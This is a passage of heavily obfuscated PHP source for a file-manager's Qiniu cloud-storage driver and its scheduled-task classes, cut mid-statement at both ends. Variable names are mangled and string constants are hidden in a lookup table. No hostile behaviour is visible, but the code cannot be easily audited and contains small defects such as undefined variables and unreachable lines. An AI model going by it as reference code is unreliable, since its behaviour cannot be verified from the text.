!1; $İ½ë‹Ê = $this->fileList($”åêË»ò); $this->listItemCache = !0; $¹°™¯›ƒ = trim($”åêË»ò, $ß‰³«ë÷[8]) . $ß‰³«ë÷[8]; if (!empty($”åêË»ò) && $”åêË»ò !== $ß‰³«ë÷[230] && !in_array($¹°™¯›ƒ, $İ½ë‹Ê[$ß‰³«ë÷[85]])) { $İ½ë‹Ê[$ß‰³«ë÷[85]][] = $¹°™¯›ƒ; } $ş€ŠÂÅ¹ = $this->delByBatch($İ½ë‹Ê[$ß‰³«ë÷[86]]); if (!$ş€ŠÂÅ¹) { return !1; } $ş€ŠÂÅ¹ = $this->delByBatch($İ½ë‹Ê[$ß‰³«ë÷[85]]); if (!$ş€ŠÂÅ¹) { return !1; } return $this->delFile($¹°™¯›ƒ); } private function delByBatch($Ÿ¸éÅŠÊ) { foreach (array_chunk($Ÿ¸éÅŠÊ, 1000) as $…‚Èª¯) { $éç…æ’ñ = $this->bucketManager->buildBatchDelete($this->bucket, $…‚Èª¯); list($ˆşÒÄ“², $ì€¹¹÷á) = $this->bucketManager->batch($éç…æ’ñ); if ($ì€¹¹÷á) { return !1; } } return !0; } public function rename($Ô®€ŞÍÌ, $¯óÛÈ›) { return $this->renameObject($Ô®€ŞÍÌ, $¯óÛÈ›); } public function fileInfo($ù‚³úĞµ, $¿ğ»¹á = false, $Ä¾òØü§ = array()) { $íÙÅ…¨¨ =& $_SERVER[™¸œØ®Ü]; $åÁ©ë = array($íÙÅ…¨¨[32] => $this->pathThis($ù‚³úĞµ), $íÙÅ…¨¨[87] => $this->getPathOuter($íÙÅ…¨¨[8] . $ù‚³úĞµ), $íÙÅ…¨¨[33] => $íÙÅ…¨¨[232], $íÙÅ…¨¨[79] => isset($Ä¾òØü§[$íÙÅ…¨¨[1553]]) ? $Ä¾òØü§[$íÙÅ…¨¨[1553]] : 0, $íÙÅ…¨¨[169] => $this->ext($ù‚³úĞµ)); if ($¿ğ»¹á) { return $åÁ©ë; } $åÁ©ë[$íÙÅ…¨¨[233]] = $åÁ©ë[$íÙÅ…¨¨[88]] = 0; $åÁ©ë[$íÙÅ…¨¨[234]] = $åÁ©ë[$íÙÅ…¨¨[235]] = !0; if (empty($Ä¾òØü§)) { $Ä¾òØü§ = $this->objectMeta($ù‚³úĞµ); if (!$Ä¾òØü§) { return $åÁ©ë; } } if (isset($Ä¾òØü§[$íÙÅ…¨¨[236]]) && $Ä¾òØü§[$íÙÅ…¨¨[236]]) { $åÁ©ë[$íÙÅ…¨¨[237]] = $Ä¾òØü§[$íÙÅ…¨¨[236]]; } if (isset($Ä¾òØü§[$íÙÅ…¨¨[247]]) && $Ä¾òØü§[$íÙÅ…¨¨[247]]) { $åÁ©ë[$íÙÅ…¨¨[237]] = $Ä¾òØü§[$íÙÅ…¨¨[247]]; } if (isset($Ä¾òØü§[$íÙÅ…¨¨[1554]])) { $åÁ©ë[$íÙÅ…¨¨[88]] = substr($Ä¾òØü§[$íÙÅ…¨¨[1554]] . $íÙÅ…¨¨[12], 0, 10); } if (isset($Ä¾òØü§[$íÙÅ…¨¨[1553]])) { $åÁ©ë[$íÙÅ…¨¨[79]] = $Ä¾òØü§[$íÙÅ…¨¨[1553]]; } return $åÁ©ë; } public function folderInfo($ª²Õ³˜ı, $ñ°¦ôÑÖ = false) { $Í‘”Ò†Ş =& $_SERVER[™¸œØ®Ü]; $ë‡Öê™ = array($Í‘”Ò†Ş[32] => $this->pathThis($ª²Õ³˜ı), $Í‘”Ò†Ş[87] => $this->getPathOuter($Í‘”Ò†Ş[8] . $ª²Õ³˜ı), $Í‘”Ò†Ş[33] => $Í‘”Ò†Ş[78]); if ($ñ°¦ôÑÖ) { return $ë‡Öê™; } $ë‡Öê™[$Í‘”Ò†Ş[233]] = $ë‡Öê™[$Í‘”Ò†Ş[88]] = 0; $ë‡Öê™[$Í‘”Ò†Ş[234]] = $ë‡Öê™[$Í‘”Ò†Ş[235]] = !0; $ª²Õ³˜ı = rtrim($ª²Õ³˜ı, $Í‘”Ò†Ş[8]) . $Í‘”Ò†Ş[8]; $œ‡ı•… = $this->objectMeta($ª²Õ³˜ı); if (isset($œ‡ı•…[$Í‘”Ò†Ş[1554]])) { $ë‡Öê™[$Í‘”Ò†Ş[88]] = substr($œ‡ı•…[$Í‘”Ò†Ş[1554]] . $Í‘”Ò†Ş[12], 0, 10); } return $ë‡Öê™; } public function listPath($©ôÀˆÜç, $âğê¤İã = false) { $Äæú¼Íò =& $_SERVER[™¸œØ®Ü]; $†«ˆæâ” = $this->fileList($©ôÀˆÜç, $Äæú¼Íò[8], !0); foreach ($†«ˆæâ”[$Äæú¼Íò[85]] as $˜¢ÁæÎ => $Ü¹—¤Ä) { $†«ˆæâ”[$Äæú¼Íò[85]][$˜¢ÁæÎ] = $this->folderInfo($Ü¹—¤Ä, $âğê¤İã); } foreach ($†«ˆæâ”[$Äæú¼Íò[86]] as $˜¢ÁæÎ => $Ü¹—¤Ä) { $†«ˆæâ”[$Äæú¼Íò[86]][$˜¢ÁæÎ] = $this->fileInfo($Ü¹—¤Ä[$Äæú¼Íò[97]], $âğê¤İã, $Ü¹—¤Ä); } return $†«ˆæâ”; } public function has($³ë©††, $­âíËÅã = false, $ÄØœ»˜ = true) { $³ö¶ŸºÌ =& $_SERVER[™¸œØ®Ü]; $³ë©†† = trim($³ë©††, $³ö¶ŸºÌ[8]); $Ÿàç¸Ïİ = empty($³ë©††) && $³ë©†† !== $³ö¶ŸºÌ[230] ? $³ö¶ŸºÌ[12] : $³ë©†† . $³ö¶ŸºÌ[8]; $¯£û½ä = $³ö¶ŸºÌ[12]; $Óå¨Ä°© = 500; $ª¹Éú… = $³ö¶ŸºÌ[8]; $âù…ÙÒ­ = $ßúªùÌ = 0; while (!0) { check_abort(); list($‚š±•Ëô, $›ÇÈÕÓø) = $this->bucketManager->listFiles($this->bucket, $Ÿàç¸Ïİ, $¯£û½ä, $Óå¨Ä°©, $ª¹Éú…); if ($›ÇÈÕÓø) { break; } $¯£û½ä = array_key_exists($³ö¶ŸºÌ[1499], $‚š±•Ëô) ? $¯£û½ä = $‚š±•Ëô[$³ö¶ŸºÌ[1555]] : $³ö¶ŸºÌ[12]; if ($­âíËÅã) { if (!empty($‚š±•Ëô[$³ö¶ŸºÌ[1556]])) { $âù…ÙÒ­ += count($‚š±•Ëô[$³ö¶ŸºÌ[1556]]); } if (!empty($‚š±•Ëô[$³ö¶ŸºÌ[1557]])) { $ßúªùÌ += count($‚š±•Ëô[$³ö¶ŸºÌ[1557]]); } if ($¯£û½ä === $³ö¶ŸºÌ[12]) { break; } continue; } if ($ÄØœ»˜) { if (!empty($‚š±•Ëô[$³ö¶ŸºÌ[1556]])) { return !0; } } else { if (!empty($‚š±•Ëô[$³ö¶ŸºÌ[1557]])) { return !0; } } if ($¯£û½ä === $³ö¶ŸºÌ[12]) { break; } } if ($­âíËÅã) { return array($³ö¶ŸºÌ[241] => $âù…ÙÒ­, $³ö¶ŸºÌ[242] => $ßúªùÌ); } return !1; } public function listAll($•ß¨ö¨À) { $¶Ó„òª‚ =& $_SERVER[™¸œØ®Ü]; $¢‘ÄîÛ¶ = $this->fileList($•ß¨ö¨À, $¶Ó„òª‚[12], !0); $½ø¿†ûè = array_to_keyvalue($¢‘ÄîÛ¶[$¶Ó„òª‚[86]], $¶Ó„òª‚[32]); foreach ($¢‘ÄîÛ¶[$¶Ó„òª‚[85]] as $Œ„Êíë¡) { if (is_string($Œ„Êíë¡)) { $½ø¿†ûè[$Œ„Êíë¡] = array($¶Ó„òª‚[79] => 0); } } return $this->listAllFiles($•ß¨ö¨À, $½ø¿†ûè); } private function fileList($ÈÓ¸ûöÇ, $™¨²ÊÑÉ = '', $õ„•é’Ÿ = 0) { $Åò¸¿Ë =& $_SERVER[™¸œØ®Ü]; $ÈÓ¸ûöÇ = trim($ÈÓ¸ûöÇ, $Åò¸¿Ë[8]); $×ÈäÒ¼‹ = empty($ÈÓ¸ûöÇ) && $ÈÓ¸ûöÇ !== $Åò¸¿Ë[230] ? $Åò¸¿Ë[12] : $ÈÓ¸ûöÇ . $Åò¸¿Ë[8]; $óÅô—ƒ = $Åò¸¿Ë[12]; $ı÷´ò€· = 1000; $²Ûôœ·÷ = $‰ß¿‰Ïˆ = array(); while (!0) { check_abort(); list($ƒƒ¬È¤¤, $Ú¹ˆæàñ) = $this->bucketManager->listFiles($this->bucket, $×ÈäÒ¼‹, $óÅô—ƒ, $ı÷´ò€·, $™¨²ÊÑÉ); if ($Ú¹ˆæàñ) { break; } $óÅô—ƒ = array_key_exists($Åò¸¿Ë[1499], $ƒƒ¬È¤¤) ? $óÅô—ƒ = $ƒƒ¬È¤¤[$Åò¸¿Ë[1555]] : $Åò¸¿Ë[12]; $šª×Ç½˜ = isset($ƒƒ¬È¤¤[$Åò¸¿Ë[1556]]) ? $ƒƒ¬È¤¤[$Åò¸¿Ë[1556]] : array(); $ú‡ ÄÍÜ = isset($ƒƒ¬È¤¤[$Åò¸¿Ë[1557]]) ? $ƒƒ¬È¤¤[$Åò¸¿Ë[1557]] : array(); foreach ($šª×Ç½˜ as $ûêïº„¸) { if ($ûêïº„¸[$Åò¸¿Ë[97]] == $×ÈäÒ¼‹) { continue; } $º«şêçÃ = $ûêïº„¸[$Åò¸¿Ë[97]]; $«æÅ©£ = $ûêïº„¸[$Åò¸¿Ë[1553]]; $ûêïº„¸[$Åò¸¿Ë[79]] = $«æÅ©£; $ŠšÈ³â = $«æÅ©£ == 0 && substr($º«şêçÃ, strlen($º«şêçÃ) - 1, 1) == $Åò¸¿Ë[8] ? !0 : !1; $this->cacheMethodInfoSet($º«şêçÃ, $ŠšÈ³â, $ûêïº„¸); if ($ŠšÈ³â) { $²Ûôœ·÷[] = $º«şêçÃ; continue; } $‰ß¿‰Ïˆ[] = $õ„•é’Ÿ ? $ûêïº„¸ : $º«şêçÃ; } foreach ($ú‡ ÄÍÜ as $º«şêçÃ) { if ($º«şêçÃ == $×ÈäÒ¼‹) { continue; } $²Ûôœ·÷[] = $º«şêçÃ; $this->cacheMethodInfoSet($º«şêçÃ, !0); } if ($óÅô—ƒ === $Åò¸¿Ë[12]) { break; } } $this->cacheMethodInfoSet($ÈÓ¸ûöÇ, !0); return array($Åò¸¿Ë[85] => $²Ûôœ·÷, $Åò¸¿Ë[86] => $‰ß¿‰Ïˆ); } public function canRead($…Ù‹‡ëù) { return $this->exist($…Ù‹‡ëù) ? !0 : !1; } public function canWrite($ÂËƒçƒÎ) { return $this->exist($ÂËƒçƒÎ) ? !0 : !1; } public function getContent($¨Ü¼èš’) { return $this->fileSubstr($¨Ü¼èš’, 0, -1); } public function setContent($å Ëå°¢, $ıìîˆÅ© = '') { $­ŸÑÔãà = $this->tempFile($this->pathThis($å Ëå°¢)); file_put_contents($­ŸÑÔãà, $ıìîˆÅ©); if ($this->upload($å Ëå°¢, $­ŸÑÔãà)) { $this->tempFileRemve($­ŸÑÔãà); return !0; } return !1; } public function refreshUrls($Íš­è­Œ) { $õµ’ğ…ï =& $_SERVER[™¸œØ®Ü]; $ËÎÆü = array(); if (is_array($Íš­è­Œ)) { foreach ($Íš­è­Œ as $ıö†¯ØÙ) { $ËÎÆü[] = $this->link($ıö†¯ØÙ); } } else { $ËÎÆü[] = $this->link($Íš­è­Œ); } $•‚•¼€ = new Qiniu\Cdn\CdnManager($this->auth); list($Œ…ä§ñë, $Š²âƒ´º) = $•‚•¼€->refreshUrls($ËÎÆü); if ($Š²âƒ´º) { return !1; } return $Œ…ä§ñë[$õµ’ğ…ï[1283]] == $õµ’ğ…ï[844] ? !0 : !1; } public function fileSubstr($›Ç§‚¬¸, $æ¤¬ƒƒÏ, $¶ÎóÌÇî) { $öÎÃÓî =& $_SERVER[™¸œØ®Ü]; if (!($šÉŠ€Œ = $this->link($›Ç§‚¬¸))) { return !1; } $­àØ›’ = !1; if ($¶ÎóÌÇî > 0) { $ö¥åÙáÔ = $æ¤¬ƒƒÏ + $¶ÎóÌÇî - 1; $­àØ›’ = array($öÎÃÓî[1558] . $æ¤¬ƒƒÏ . $öÎÃÓî[464] . $ö¥åÙáÔ); } $»¸çÓ„Ã = url_request($šÉŠ€Œ, $öÎÃÓî[1518], !1, $­àØ›’); return $»¸çÓ„Ã[$öÎÃÓî[835]] ? $»¸çÓ„Ã[$öÎÃÓî[1306]] : !1; } public function upload($°ƒ§ÆŒù, $çèœá¤ñ, $ëÏ®ûõô = false, $…ˆçÕ‘ = REPEAT_REPLACE) { $æ“Ó¿ü– = new Qiniu\Storage\UploadManager(); $¥úá‡ˆ = $this->auth->uploadToken($this->bucket, $°ƒ§ÆŒù); $Ñ¬ÄÍóÒ = get_file_mime(get_path_ext($çèœá¤ñ)); list($×“µ¬È, $™Ü–„Ã) = $æ“Ó¿ü–->putFile($¥úá‡ˆ, $°ƒ§ÆŒù, $çèœá¤ñ, null, $Ñ¬ÄÍóÒ); return $™Ü–„Ã ? !1 : $this->getPathOuter($°ƒ§ÆŒù); } public function uploadFormData($áçœÓÍç, $±±Ü÷À½ = 3600) { return $this->uploadToken($áçœÓÍç, $±±Ü÷À½); } public function uploadMultiData($Ââøœä, $åİ†Ó§‡ = 3600) { return $this->uploadToken($Ââøœä, $åİ†Ó§‡); } private function uploadToken($¿±Ú¡Ñ, $¬àí×ìØ = 3600) { $ »¡®ĞÍ =& $_SERVER[™¸œØ®Ü]; $ÍÉ ”Ë˜ = $¬àí×ìØ; $…¶¤À› = array($ »¡®ĞÍ[1559] => $ »¡®ĞÍ[1560]); $›‡ñºó = $¿±Ú¡Ñ; $úå±¢ßª = $this->auth->uploadToken($this->bucket, $›‡ñºó, $ÍÉ ”Ë˜, $…¶¤À›, !0); $æ¬ÕÏÖ = empty($this->region) || $this->region == $ »¡®ĞÍ[1561] ? $ »¡®ĞÍ[12] : $ »¡®ĞÍ[464] . $this->region; $ÑÌŠ = http_type() . "\72\57\57\x75\160\x6c\157\x61\144{$æ¬ÕÏÖ}\x2e\x71\151\x6e\151\165\160\56\x63\x6f\155\57"; return array($ »¡®ĞÍ[1562] => $úå±¢ßª, $ »¡®ĞÍ[1563] => $ÑÌŠ); } public function download($Ëç¹ôîº, $’´­šè†) { $€¼Ò¯í = IO::getPathInner(IO::mkfile($’´­šè†)); if (!($¯Âä¤òÁ = $this->link($Ëç¹ôîº))) { return !1; } $ÚÛİëª¯ = 0; $¥Š™à”— = 1024 * 200; $‡” ğ®Ê = fopen($€¼Ò¯í, $_SERVER[™¸œØ®Ü][1564]); while (!0) { $–±¸´èè = $this->fileSubstr($Ëç¹ôîº, $ÚÛİëª¯, $¥Š™à”—); if ($–±¸´èè === !1) { return !1; } fwrite($‡” ğ®Ê, $–±¸´èè); $ÚÛİëª¯ += $¥Š™à”—; if (strlen($–±¸´èè) < $¥Š™à”—) { break; } } fclose($‡” ğ®Ê); return $’´­šè†; } public function link($Êç¢„ô, $¬ÈÅí = '') { if (!$this->isFile($Êç¢„ô)) { return !1; } $Û×Ñ¤öÕ = $this->getHost() . $_SERVER[™¸œØ®Ü][8] . $this->pathEncode($Êç¢„ô) . $¬ÈÅí; return $this->auth->privateDownloadUrl($Û×Ñ¤öÕ, 3600 * 12); } public function fileOut($ŸúÉ¥ñ±, $—¯ëŸ×Ù = false, $É´ı¢¢ = false, $¤Ù»š£Å = '') { $Üóç¶å’ =& $_SERVER[™¸œØ®Ü]; if ($this->isFileOutServer()) { return $this->fileOutServer($ŸúÉ¥ñ±, $—¯ëŸ×Ù, $É´ı¢¢, $¤Ù»š£Å); } if (!$É´ı¢¢) { $É´ı¢¢ = $this->pathThis($ŸúÉ¥ñ±); } $ËË‹š›¨ = $—¯ëŸ×Ù ? $Üóç¶å’[1565] . rawurlencode($É´ı¢¢) : $Üóç¶å’[12]; $òÛË÷ÊÌ = $this->link($ŸúÉ¥ñ±, $ËË‹š›¨); $this->fileOutLink($òÛË÷ÊÌ); } public function fileOutServer($ÛıÌĞÆá, $™²ÄÆÇ = false, $ú¤¯»Ò = false, $¨À·­û÷ = '') { parent::fileOut($ÛıÌĞÆá, $™²ÄÆÇ, $ú¤¯»Ò, $¨À·­û÷); } public function fileOutImage($ì·È, $¨Œ«³İÅ = 250) { if ($this->size($ì·È) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ì·È, $¨Œ«³İÅ); } $úãœá„Ø = $this->link($ì·È, $_SERVER[™¸œØ®Ü][1566] . $¨Œ«³İÅ); $this->fileOutLink($úãœá„Ø); } public function fileOutImageServer($»˜¬¾š, $Ä”è¢¡ = 250) { parent::fileOutImage($»˜¬¾š, $Ä”è¢¡); } public function hashMd5($¹¸íÄ™) { $î“¡Ïó³ =& $_SERVER[™¸œØ®Ü]; $‚±Ïº³Å = $this->objectMeta($¹¸íÄ™); return isset($‚±Ïº³Å[$î“¡Ïó³[247]]) ? $‚±Ïº³Å[$î“¡Ïó³[247]] : !1; $¡·—®» = $this->link($¹¸íÄ™, $î“¡Ïó³[1567]); } public function size($·ï¶ëÃÔ) { $÷ßšÇäİ = $this->objectMeta($·ï¶ëÃÔ); return $÷ßšÇäİ ? $÷ßšÇäİ[$_SERVER[™¸œØ®Ü][79]] : 0; } public function info($Ïá»Ÿ©) { if ($this->isFolder($Ïá»Ÿ©)) { return $this->folderInfo($Ïá»Ÿ©); } else { if ($this->isFile($Ïá»Ÿ©)) { return $this->fileInfo($Ïá»Ÿ©); } } return !1; } public function exist($¼¥üú’±) { return $this->isFile($¼¥üú’±) || $this->isFolder($¼¥üú’±); } public function isFile($ŠÉÉÌ‡ğ) { return !$this->isFolder($ŠÉÉÌ‡ğ) && $this->objectMeta($ŠÉÉÌ‡ğ); } public function isFolder($ÍÓºŠı) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][179], $ÍÓºŠı); } protected function objectMeta($Ìûßš‰) { return $this->cacheMethod($_SERVER[™¸œØ®Ü][181], $Ìûßš‰); } protected function _objectMeta($ûÃÄŞ®ä) { $•ò –Øš =& $_SERVER[™¸œØ®Ü]; list($²éˆîá¯, $õ¡ÈÜ¢Ö) = $this->bucketManager->stat($this->bucket, $ûÃÄŞ®ä); if ($²éˆîá¯) { $²éˆîá¯[$•ò –Øš[79]] = intval($²éˆîá¯[$•ò –Øš[1553]]); } return $²éˆîá¯; } protected function _isFolder($ÀùÕêš¯) { $€ïõøèÉ =& $_SERVER[™¸œØ®Ü]; if ($ÀùÕêš¯ == $€ïõøèÉ[12] || $ÀùÕêš¯ == $€ïõøèÉ[8]) { return !0; } list($Â†˜Íñ, $¥¨öòË§) = $this->bucketManager->listFiles($this->bucket, trim($ÀùÕêš¯, $€ïõøèÉ[8]) . $€ïõøèÉ[8], $€ïõøèÉ[12], 1, $€ïõøèÉ[8]); return !empty($Â†˜Íñ[$€ïõøèÉ[1556]]) || !empty($Â†˜Íñ[$€ïõøèÉ[1557]]) ? !0 : !1; } } goto DˆšŸâ¤ÇÙ; eØÌ”›‰‰À: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $îÑõÉñ =& $_SERVER[™¸œØ®Ü]; if (self::valueGet($îÑõÉñ[835]) != $îÑõÉñ[91]) { return; } if (self::valueGet($îÑõÉñ[1744]) == $îÑõÉñ[91]) { $Ô’»·É = self::valueGet($îÑõÉñ[1745]); if (time() - $Ô’»·É > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($îÑõÉñ[1744], $îÑõÉñ[91]); self::log($îÑõÉñ[1746] . ACTION . $îÑõÉñ[1747]); Hook::bind($îÑõÉñ[1748], $îÑõÉñ[1749]); $ƒöşÊ = 0; while (!0) { self::cacheClear(); if (self::valueGet($îÑõÉñ[835]) != $îÑõÉñ[91]) { self::valueSet($îÑõÉñ[1744], $îÑõÉñ[230]); self::log($îÑõÉñ[1750]); die; } $›ñ…®Šï = time(); if ($›ñ…®Šï - $ƒöşÊ >= 60) { self::valueSet(array($îÑõÉñ[1744] => $îÑõÉñ[91], $îÑõÉñ[1745] => $›ñ…®Šï)); $ƒöşÊ = $›ñ…®Šï; } if (!file_exists(USER_SYSTEM . $îÑõÉñ[1751])) { self::valueSet(array($îÑõÉñ[1744] => $îÑõÉñ[230], $îÑõÉñ[835] => $îÑõÉñ[230])); self::log($îÑõÉñ[1752]); die; } $†åöşË = file_get_contents(BASIC_PATH . $îÑõÉñ[1753]); $¤ÛÃä¨ = KOD_VERSION . $îÑõÉñ[10] . KOD_VERSION_BUILD; $µïÀŸ¤ = match_text($†åöşË, $îÑõÉñ[1754]) . $îÑõÉñ[10] . match_text($†åöşË, $îÑõÉñ[1755]); if ($µïÀŸ¤ != $¤ÛÃä¨) { self::restart(); self::log("\163\x74\x6f\160\145\x64\56\x5b\x76\x65\x72\163\x69\157\x6e\40\165\x70\144\141\164\x65\x3b{$versionNow}\x20\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $·ÇŞù…¯ =& $_SERVER[™¸œØ®Ü]; http_close(); $GLOBALS[$·ÇŞù…¯[1756]] = 1; $_SERVER[$·ÇŞù…¯[1757]] = $·ÇŞù…¯[1758]; $_COOKIE = array(); $GLOBALS[$·ÇŞù…¯[1759]] = 1; $GLOBALS[$·ÇŞù…¯[1760]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ï”êøà— =& $_SERVER[™¸œØ®Ü]; http_close(); self::valueSet($Ï”êøà—[835], $Ï”êøà—[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ï”êøà—[1744] => $Ï”êøà—[230], $Ï”êøà—[835] => $Ï”êøà—[91])); self::log($Ï”êøà—[1761]); } public static function taskSwitch() { $ªæ‰Ó”á =& $_SERVER[™¸œØ®Ü]; $ºÓŒş¹× = self::valueGet($ªæ‰Ó”á[835]) == $ªæ‰Ó”á[91] ? $ªæ‰Ó”á[230] : $ªæ‰Ó”á[91]; self::valueSet($ªæ‰Ó”á[835], $ºÓŒş¹×); } public static function shutdownEvent() { $¶¡¯•µÁ =& $_SERVER[™¸œØ®Ü]; self::valueSet($¶¡¯•µÁ[1744], $¶¡¯•µÁ[230]); self::log($¶¡¯•µÁ[1762]); } public static function config($ñ’Ñò–¡, $ÂëâèŠ) { self::valueSet($_SERVER[™¸œØ®Ü][835], $ñ’Ñò–¡); } private static function taskRunAll() { $‡åÒüòï =& $_SERVER[™¸œØ®Ü]; $âŸÛÊš› = timeFloat(); $Ùı—§»Ï = Model($‡åÒüòï[1763])->listData(); $½±®íÄş = count($Ùı—§»Ï); for ($ËÌ…‘Ô· = 0; $ËÌ…‘Ô· < $½±®íÄş; $ËÌ…‘Ô·++) { $ØÓ¼Û¼¥ = $Ùı—§»Ï[$ËÌ…‘Ô·]; if (!$ØÓ¼Û¼¥[$‡åÒüòï[477]] || $ØÓ¼Û¼¥[$‡åÒüòï[1764]] != $‡åÒüòï[91]) { continue; } if (!self::taskTimeCheck($ØÓ¼Û¼¥)) { continue; } self::taskRun($ØÓ¼Û¼¥); } Hook::trigger($‡åÒüòï[1765]); self::taskQueueRun($âŸÛÊš›); } private static function taskQueueRun($”ÖûÙàß) { $ºÉùçÀÃ = 10; while (!0) { $ßöç÷Úï = TaskQueue::run(); if ($ßöç÷Úï === !1) { break; } if (timeFloat() - $”ÖûÙàß >= $ºÉùçÀÃ) { break; } } } private static function taskTimeCheck($şØ±Ï‘É) { $¶Å­¡¾î =& $_SERVER[™¸œØ®Ü]; $ÖŸèôô = json_decode($şØ±Ï‘É[$¶Å­¡¾î[206]], !0); $üòµ÷ì = intval($şØ±Ï‘É[$¶Å­¡¾î[1745]]); $´¦Ì¨‰ = strtotime($¶Å­¡¾î[1766] . $ÖŸèôô[$¶Å­¡¾î[1767]] . $¶Å­¡¾î[1768]) - strtotime($¶Å­¡¾î[1769]); $£’ÂÑèº = time() - strtotime(date($¶Å­¡¾î[1770]) . $¶Å­¡¾î[1771]); $Éİà¾åü = $£’ÂÑèº >= $´¦Ì¨‰ && $£’ÂÑèº <= $´¦Ì¨‰ + 3600; switch ($ÖŸèôô[$¶Å­¡¾î[33]]) { case $¶Å­¡¾î[1772]: if (time() - $üòµ÷ì < 3600 * 24 * 30) { return !1; } if ($ÖŸèôô[$¶Å­¡¾î[1772]] == date($¶Å­¡¾î[1773]) && $Éİà¾åü) { return !0; } break; case $¶Å­¡¾î[1774]: if (time() - $üòµ÷ì < 3600 * 24 * 7) { return !1; } $ß¡¯Ğ­ = date($¶Å­¡¾î[1775]) == 0 ? 7 : date($¶Å­¡¾î[1775]); if ($ÖŸèôô[$¶Å­¡¾î[1774]] == $ß¡¯Ğ­ && $Éİà¾åü) { return !0; } break; case $¶Å­¡¾î[1767]: if (time() - $üòµ÷ì < 3600 * 24) { return !1; } if ($Éİà¾åü) { return !0; } break; case $¶Å­¡¾î[1776]: if (time() - $üòµ÷ì >= floatval($ÖŸèôô[$¶Å­¡¾î[1776]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $åĞ–¨Û¦ =& $_SERVER[™¸œØ®Ü]; static $§®†·’ = 0; $Ù¯Ãì³ = 300; if (!$§®†·’) { $§®†·’ = time(); } if (time() - $§®†·’ < $Ù¯Ãì³) { return; } $§®†·’ = time(); $ı—„²Ê£ = Model($åĞ–¨Û¦[581])->db($åĞ–¨Û¦[12]); if ($ı—„²Ê£) { $ı—„²Ê£->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($åĞ–¨Û¦[1777], $åĞ–¨Û¦[1778]); die; } } public static function taskRun($Š‘ö÷”Ğ) { $¿à•Ü©ó =& $_SERVER[™¸œØ®Ü]; self::log($¿à•Ü©ó[1779] . $Š‘ö÷”Ğ[$¿à•Ü©ó[477]] . $¿à•Ü©ó[1780] . $Š‘ö÷”Ğ[$¿à•Ü©ó[32]] . $¿à•Ü©ó[1781] . $Š‘ö÷”Ğ[$¿à•Ü©ó[1782]]); Model($¿à•Ü©ó[1763])->run($Š‘ö÷”Ğ[$¿à•Ü©ó[477]]); $··…ÉÛ¾ = timeFloat(); $¢ÙÑ´Şö = $¿à•Ü©ó[12]; switch ($Š‘ö÷”Ğ[$¿à•Ü©ó[33]]) { case $¿à•Ü©ó[384]: $Í÷ª”ë = url_request($Š‘ö÷”Ğ[$¿à•Ü©ó[1782]], $¿à•Ü©ó[1518], !1, !1, !1, !1, 10); if ($Í÷ª”ë[$¿à•Ü©ó[835]]) { $¢ÙÑ´Şö = strlen($Í÷ª”ë[$¿à•Ü©ó[1306]]); } break; case $¿à•Ü©ó[1783]: $¢ÙÑ´Şö = Hook::apply($Š‘ö÷”Ğ[$¿à•Ü©ó[1782]]); default: break; } Model($¿à•Ü©ó[1784])->add(array($¿à•Ü©ó[1785] => $¿à•Ü©ó[12], $¿à•Ü©ó[1786] => $¿à•Ü©ó[230], $¿à•Ü©ó[33] => $¿à•Ü©ó[1787] . $Š‘ö÷”Ğ[$¿à•Ü©ó[477]], $¿à•Ü©ó[1788] => json_encode(array($¿à•Ü©ó[32] => $Š‘ö÷”Ğ[$¿à•Ü©ó[32]], $¿à•Ü©ó[1789] => timeFloat() - $··…ÉÛ¾, $¿à•Ü©ó[370] => $¢ÙÑ´Şö)))); $ÊÆ®ï»ù = $¢ÙÑ´Şö ? $¿à•Ü©ó[1790] . $¢ÙÑ´Şö : $¿à•Ü©ó[12]; self::log($¿à•Ü©ó[1791] . $Š‘ö÷”Ğ[$¿à•Ü©ó[477]] . $¿à•Ü©ó[178] . $ÊÆ®ï»ù); return !0; } public static function valueGet($ÌŠ…À÷Å) { $¡Â–«® =& $_SERVER[™¸œØ®Ü]; $â³Ûã¨Ö = $¡Â–«®[1792]; $Ê¹ÓãİÚ = Model($¡Â–«®[510])->get($ÌŠ…À÷Å, $â³Ûã¨Ö); if (is_null($Ê¹ÓãİÚ)) { Model($¡Â–«®[510])->set($¡Â–«®[835], $¡Â–«®[91], $â³Ûã¨Ö); Model($¡Â–«®[510])->set($¡Â–«®[1744], $¡Â–«®[230], $â³Ûã¨Ö); $Ê¹ÓãİÚ = Model($¡Â–«®[510])->get($ÌŠ…À÷Å, $â³Ûã¨Ö); } return $Ê¹ÓãİÚ; } private static function valueSet($ÒŒÃ×², $‚Û÷Ö‹ = false) { $åññÔèÉ =& $_SERVER[™¸œØ®Ü]; $ëÑïû° = $åññÔèÉ[1793]; CacheLock::lock($ëÑïû°); $İ¢³¡›™ = Model($åññÔèÉ[510])->set($ÒŒÃ×², $‚Û÷Ö‹, $åññÔèÉ[1792]); CacheLock::unlock($ëÑïû°); return $İ¢³¡›™; } protected static function log($ˆ±ÑùØ‘) { write_log($ˆ±ÑùØ‘, $_SERVER[™¸œØ®Ü][1778]); } private static function cacheClear() { $¨¤Çìœ“ =& $_SERVER[™¸œØ®Ü]; Cache::clearMemory(Model($¨¤Çìœ“[510])->cacheKey($¨¤Çìœ“[1792])); Cache::clearMemory(Model($¨¤Çìœ“[510])->cacheKey($¨¤Çìœ“[1794])); Model($¨¤Çìœ“[1763])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\165\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ùúğ²„†, $°Ö²Ü„‘ = '', $âØâÏéî = 0, $óÓ°í¬¸ = '') { $ŸÔ¸½Éõ =& $_SERVER[™¸œØ®Ü]; if (self::get($ùúğ²„†)) { return; } $this->task = array($ŸÔ¸½Éõ[477] => $ùúğ²„†, $ŸÔ¸½Éõ[1795] => USER_ID, $ŸÔ¸½Éõ[1683] => 